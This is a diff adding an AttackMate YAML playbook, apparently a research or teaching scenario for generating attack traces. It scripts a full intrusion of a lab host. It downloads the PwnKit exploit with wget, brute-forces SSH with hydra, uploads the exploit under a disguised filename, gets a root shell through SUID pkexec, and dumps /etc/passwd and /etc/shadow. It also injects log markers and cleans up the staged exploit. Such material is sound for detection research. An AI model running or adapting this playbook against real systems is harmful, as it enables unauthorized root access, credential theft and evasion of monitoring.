@@ -1,0 +1,300 @@
+#
+# Author: AttackMate Privilege-Escalation experiment (MIRANDA teaching example)
+# Description:
+#     PwnKit privilege escalation plus credential access. We stage the prebuilt PwnKit
+#     ELF; hydra brute-forces a non-sudo account (artoo_detoo); we log in and confirm
+#     SUID /usr/bin/pkexec, then run PwnKit (CVE-2021-4034) -- disguised as
+#     /tmp/word_script -- to spawn a root shell, and dump /etc/passwd + /etc/shadow.
+#     artoo_detoo has no sudo, so PwnKit is the only path to root. The staged exploit is
+#     cleaned up.
+#
+#     Tactic flow: Resource Development (stage exploit) -> Credential Access -> Initial Access -> Discovery -> Privilege Escalation -> Credential Access
+#     (Defense Evasion runs throughout: the log-injection marker rides every step.)
+#
+# AUTHORIZED USE ONLY:
+#     Run this only against systems you own or have explicit written permission to test.
+#
+vars:
+  TARGET: 172.28.128.3
+  BRUTE_USER: artoo_detoo
+  PASSWDLIST: ~/tmp/passwd          # pre-existing wordlist on the op host (must contain the password)
+  STAGED: /tmp/word_script          # disguised on-target exploit path (not the tell-tale /tmp/PwnKit)
+  PWNKIT_URL: https://github.com/ly4k/PwnKit/raw/main/PwnKit
+  # Log-injection marker. Space-free single token: auditd hex-encodes any argv that contains
+  # a space, which would break the marker join across the access.log / auth.log / auditd layers.
+  INJECTION: "this_is_the_injection"
+
+commands:
+
+  # ===================== Phase A: operator-side prep =====================
+
+  - type: shell
+    cmd: "mkdir -p /tmp/pe_pwnkit"
+    metadata:
+      description: "Stage a local directory on the operator host to collect proof/output"
+
+  - type: mktemp
+    variable: PWNKIT
+    metadata:
+      description: "Local tempfile for the PwnKit binary"
+      techniques: "T1588.002"
+      tactics: "Resource Development"
+
+  - type: shell
+    cmd: wget -q -O $PWNKIT $PWNKIT_URL
+    metadata:
+      description: "Download the prebuilt PwnKit (CVE-2021-4034) exploit"
+      techniques: "T1588.002"
+      tactics: "Resource Development"
+
+  # ===================== Phase 0: pre-exploit log poisoning =====================
+  - type: http-client
+    cmd: GET
+    url: http://$TARGET/?probe=1
+    useragent: "$INJECTION"
+    exit_on_error: False
+    metadata:
+      description: "Benign-looking GET whose User-Agent seeds the marker into the Apache access log"
+      techniques: "T1562.006"
+      tactics: "Defense Evasion"
+
+  - type: sleep
+    seconds: 4
+    min_sec: 1
+    random: True
+    metadata:
+      description: "Human-paced jitter between the two probes"
+
+  - type: ssh
+    cmd: id
+    username: "$INJECTION"
+    password: "x"
+    hostname: $TARGET
+    interactive: False
+    exit_on_error: False
+    metadata:
+      description: "Bogus SSH username injection -> poisons auth.log (Invalid user ...)"
+      techniques: "T1110.001,T1562.006"
+      tactics: "Credential Access,Defense Evasion"
+
+  # ===================== Phase 1: Credential Access (SSH brute force) =====================
+
+  # Brute-force the SSH password for BRUTE_USER with hydra, using the op host's wordlist.
+  - type: shell
+    cmd: hydra -l $BRUTE_USER -P $PASSWDLIST ssh://$TARGET
+    metadata:
+      description: "Brute-force the SSH password with hydra"
+      techniques: "T1110.001"
+      tactics: "Credential Access"
+
+  # Pre-seed CRACKED so a no-match (hydra failed to crack) is obvious downstream instead of
+  # silently substituting a literal "$CRACKED".
+  - type: setvar
+    variable: CRACKED
+    cmd: "PARSE_FAILED"
+    metadata:
+      description: "Pre-seed the cracked-password variable so a parse failure is detectable"
+      techniques: "T1110.001"
+      tactics: "Credential Access"
+
+  # Parse the cracked password into $CRACKED. mode: findall (NOT search) so the capture group
+  # is returned - mode: search returns the WHOLE matched line, not the group.
+  - type: regex
+    input: RESULT_STDOUT
+    cmd: "login:\\s+$BRUTE_USER\\s+password:\\s+(\\S+)"
+    mode: findall
+    output:
+      CRACKED: "$MATCH_0"
+    metadata:
+      description: "Parse the cracked SSH password from the hydra output"
+      techniques: "T1110.001"
+      tactics: "Credential Access"
+
+  - type: debug
+    cmd: "Cracked SSH password for $BRUTE_USER: $CRACKED"
+    metadata:
+      description: "Print the cracked credential (PARSE_FAILED means hydra did not crack it)"
+
+  # Log in with the cracked credential and open the reused foothold session; the proof `id`
+  # is wrapped so its execve also carries the marker.
+  - type: ssh
+    cmd: "bash -c 'id' \"$INJECTION\""
+    username: $BRUTE_USER
+    password: "$CRACKED"
+    hostname: $TARGET
+    interactive: False
+    creates_session: "foothold"
+    metadata:
+      description: "Log in over SSH using the brute-forced password; execve poisoned with the marker"
+      techniques: "T1078,T1021.004,T1033,T1562.006"
+      tactics: "Initial Access,Lateral Movement,Discovery,Defense Evasion"
+
+  - type: sleep
+    min_sec: 2
+    seconds: 6
+    random: True
+    metadata:
+      description: "Operator-side think time before enumeration (human pacing)"
+
+  # ===================== Phase 2: Discovery / enumeration =====================
+  # Non-interactive over the foothold (still unprivileged), one wrapped command per step so
+  # each lands as its own auditd execve record with the marker as the trailing argv.
+
+  - type: ssh
+    cmd: "bash -c 'id' \"$INJECTION\""
+    session: "foothold"
+    interactive: False
+    exit_on_error: False
+    save: /tmp/pe_pwnkit/disc_01_id.txt
+    metadata:
+      description: "Current identity (expect non-root artoo_detoo); execve poisoned with the marker"
+      techniques: "T1033,T1562.006"
+      tactics: "Discovery,Defense Evasion"
+
+  - type: ssh
+    cmd: "bash -c 'uname -a' \"$INJECTION\""
+    session: "foothold"
+    interactive: False
+    exit_on_error: False
+    save: /tmp/pe_pwnkit/disc_02_uname.txt
+    metadata:
+      description: "Kernel name/version/arch (kernel-exploit surface); execve poisoned with the marker"
+      techniques: "T1082,T1562.006"
+      tactics: "Discovery,Defense Evasion"
+
+  # SUID search: CONFIRMS /usr/bin/pkexec is present (gates the PwnKit PE). Readable as an
+  # unprivileged user - the file metadata is world-visible.
+  - type: ssh
+    cmd: "bash -c 'find / -perm -4000 -type f 2>/dev/null' \"$INJECTION\""
+    session: "foothold"
+    interactive: False
+    exit_on_error: False
+    save: /tmp/pe_pwnkit/disc_03_suid.txt
+    metadata:
+      description: "SUID binary inventory (look for /usr/bin/pkexec); execve poisoned with the marker"
+      techniques: "T1083,T1562.006"
+      tactics: "Discovery,Defense Evasion"
+
+  - type: debug
+    cmd: "[pwnkit_privesc] SUID inventory (confirm /usr/bin/pkexec) -> $RESULT_STDOUT"
+    metadata:
+      description: "Surface the SUID search output inline (must contain /usr/bin/pkexec)"
+      techniques: "T1083"
+      tactics: "Discovery"
+
+  - type: sleep
+    min_sec: 2
+    seconds: 7
+    random: True
+    metadata:
+      description: "Operator-side think time before privilege escalation (human pacing)"
+
+  # ===================== Phase 3: Privilege Escalation (PwnKit, disguised) =====================
+
+  # Stage the exploit on the target (executable) over the foothold's sftp transport, under a
+  # benign disguised name so no "PwnKit" string lands on disk / in the audit trail.
+  - type: sftp
+    cmd: put
+    local_path: $PWNKIT
+    remote_path: $STAGED
+    mode: "755"
+    session: "foothold"
+    metadata:
+      description: "Upload the PwnKit binary disguised as $STAGED"
+      techniques: "T1105,T1036.005"
+      tactics: "Command and Control,Defense Evasion"
+
+  # Run the disguised exploit; it abuses SUID pkexec and spawns a root shell ON this session.
+  # Go interactive and wait for the '#' prompt (command_timeout 0). Left UNWRAPPED so the
+  # prompt wait works. The session stays interactive/root from here on. Adjust `prompts:`
+  # after the first live run if the spawned prompt differs.
+  - type: ssh
+    cmd: "$STAGED\n"
+    session: "foothold"
+    interactive: True
+    command_timeout: 0
+    exit_on_error: False
+    metadata:
+      description: "Execute the disguised PwnKit to abuse SUID pkexec (CVE-2021-4034) and spawn a root shell"
+      techniques: "T1068,T1548"
+      tactics: "Privilege Escalation"
+
+  # Confirm root before proceeding (wrapped so the proof's execve carries the marker).
+  - type: ssh
+    cmd: "bash -c 'id' \"$INJECTION\"\n"
+    session: "foothold"
+    interactive: True
+    exit_on_error: False
+    save: /tmp/pe_pwnkit/pe_01_root_id.txt
+    metadata:
+      description: "Confirm root (expect uid=0); execve poisoned with the injection marker"
+      techniques: "T1033,T1562.006"
+      tactics: "Discovery,Defense Evasion"
+
+  - type: debug
+    cmd: "[pwnkit_privesc] post-PwnKit id (expect uid=0) -> $RESULT_STDOUT"
+    metadata:
+      description: "Surface the root identity inline"
+      techniques: "T1033"
+      tactics: "Discovery"
+
+  - type: sleep
+    min_sec: 2
+    seconds: 6
+    random: True
+    metadata:
+      description: "Operator-side think time before credential access (human pacing)"
+
+  # ===================== Phase 4: Credential Access (root) =====================
+  # Still root/interactive. Dump the credential store off disk; save: writes it operator-side.
+
+  - type: ssh
+    cmd: "bash -c 'cat /etc/passwd' \"$INJECTION\"\n"
+    session: "foothold"
+    interactive: True
+    exit_on_error: False
+    save: /tmp/pe_pwnkit/ca_01_passwd.txt
+    metadata:
+      description: "Dump /etc/passwd account inventory; execve poisoned with the injection marker"
+      techniques: "T1003.008,T1562.006"
+      tactics: "Credential Access,Defense Evasion"
+
+  - type: ssh
+    cmd: "bash -c 'cat /etc/shadow' \"$INJECTION\"\n"
+    session: "foothold"
+    interactive: True
+    exit_on_error: False
+    save: /tmp/pe_pwnkit/ca_02_shadow.txt
+    metadata:
+      description: "Dump /etc/shadow password hashes; execve poisoned with the injection marker"
+      techniques: "T1003.008,T1562.006"
+      tactics: "Credential Access,Defense Evasion"
+
+  # ===================== Phase 5: Cleanup (tooling only) =====================
+
+  # Remove the staged exploit on the target. Wrapped so the removal's own execve carries the marker.
+  - type: ssh
+    cmd: "bash -c 'rm -f $STAGED' \"$INJECTION\"\n"
+    session: "foothold"
+    interactive: True
+    exit_on_error: False
+    metadata:
+      description: "Remove the staged exploit ($STAGED); execve poisoned with the injection marker"
+      techniques: "T1070.004,T1562.006"
+      tactics: "Defense Evasion"
+
+  # Operator-side: remove the local PwnKit temp file (leave the pre-existing wordlist in place).
+  - type: shell
+    cmd: "rm -f $PWNKIT"
+    exit_on_error: False
+    metadata:
+      description: "Remove the operator-side PwnKit temp file"
+      techniques: "T1070.004"
+      tactics: "Defense Evasion"
+
+  - type: debug
+    cmd: "[pwnkit_privesc] complete -> proof under /tmp/pe_pwnkit/ (disc_0*, pe_01_root_id, ca_01_passwd, ca_02_shadow)"
+    metadata:
+      description: "Summary of where the trace's proof landed"
+      techniques: "T1003.008"
+      tactics: "Credential Access"
